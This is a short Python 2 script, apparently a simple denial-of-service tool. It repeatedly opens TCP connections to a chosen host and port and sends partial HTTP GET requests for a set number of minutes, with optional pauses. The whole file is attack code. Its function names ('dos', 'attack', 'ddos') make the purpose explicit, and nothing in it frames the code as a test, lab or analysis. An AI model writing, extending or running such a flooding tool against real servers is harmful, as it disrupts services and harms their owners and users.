import time, socket, datetime

message = "random"


def dos(host, port, duration, pause):
    finish_time = datetime.datetime.now() + datetime.timedelta(minutes=int(duration))
    while datetime.datetime.now() < finish_time:
        attack(host, port)
        if int(pause) != 0:
            time.sleep(int(pause))
    else:
        return "Success"


def attack(host, port):
    print host
    try:
        ip = socket.gethostbyname(host)
    except:
        return "Failed to gethostbyname"
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, int(port)))
        ddos.send("GET /%s HTTP/1.1\r\n" % message)
        ddos.sendto("GET /%s HTTP/1.1\r\n" % message, (ip, int(port)))
        ddos.send("GET /%s HTTP/1.1\r\n" % message)
    except socket.error, msg:
        return "Connection Failed"
    ddos.close()
    return True
